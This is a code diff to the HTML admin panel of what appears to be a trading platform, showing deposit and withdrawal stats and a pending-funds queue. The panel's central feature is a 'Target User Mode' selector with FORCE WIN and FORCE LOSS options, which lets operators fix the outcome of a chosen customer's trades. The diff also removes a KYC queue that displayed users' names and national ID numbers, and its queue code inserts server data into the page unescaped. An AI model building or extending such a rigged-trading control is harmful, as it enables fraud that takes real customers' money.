@@ -8,7 +8,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
     body { background: #0b0e14; color: white; padding: 20px; }
     .card { background: #161c28; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #222b3d; }
-    h2 { color: #00e676; margin-bottom: 15px; }
+    h2 { color: #00e676; margin-bottom: 15px; font-size: 18px; }
     .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 10px; margin-bottom: 20px; }
     .stat { background: #0b0e14; padding: 12px; border-radius: 8px; text-align: center; }
     .val { font-size: 18px; font-weight: bold; color: #00e676; margin-top: 5px; }
@@ -28,7 +28,7 @@
 
   <div id="dashboard" style="display: none;">
     <div class="card">
-      <h2>Financial Reports</h2>
+      <h2>Financial Accounting Reports</h2>
       <div class="grid">
         <div class="stat">1h Deposit<div class="val" id="d-1h-dep">$0.00</div></div>
         <div class="stat">1h Withdraw<div class="val" style="color:#ff1744;" id="d-1h-with">$0.00</div></div>
@@ -38,11 +38,11 @@
     </div>
 
     <div class="card">
-      <h2>Target User Trade Manipulation Strategy</h2>
+      <h2>OTC Trade Manipulation Control</h2>
       <div style="display: flex; gap: 10px; align-items: center;">
-        <span style="font-size: 14px;">User Strategy:</span>
+        <span style="font-size: 14px;">Target User Mode:</span>
         <select id="user-mode" onchange="setMode()">
-          <option value="AUTO">AUTO (Natural System Algorithm)</option>
+          <option value="AUTO">AUTO (Natural System)</option>
           <option value="FORCE_WIN">FORCE WIN (User Always Wins)</option>
           <option value="FORCE_LOSS">FORCE LOSS (User Always Loses)</option>
         </select>
@@ -50,13 +50,8 @@
     </div>
 
     <div class="card">
-      <h2>Pending Deposit & Withdrawal Queue</h2>
+      <h2>Pending Deposits & Withdrawals Queue</h2>
       <div id="queue-list"></div>
-    </div>
-
-    <div class="card">
-      <h2>Pending KYC Documents Queue</h2>
-      <div id="kyc-list"></div>
     </div>
   </div>
 
@@ -106,15 +101,6 @@
           });
 
           document.getElementById('queue-list').innerHTML = html || 'No pending financial requests';
-
-          let kycHtml = '';
-          data.pendingKYCs.forEach(k => {
-            kycHtml += `<div class="queue-row">
-              <span>KYC: ${k.name} - NID: ${k.nidNumber}</span>
-              <div><button class="btn-approve">Approve KYC</button></div>
-            </div>`;
-          });
-          document.getElementById('kyc-list').innerHTML = kycHtml || 'No pending KYC submissions';
         });
     }
 
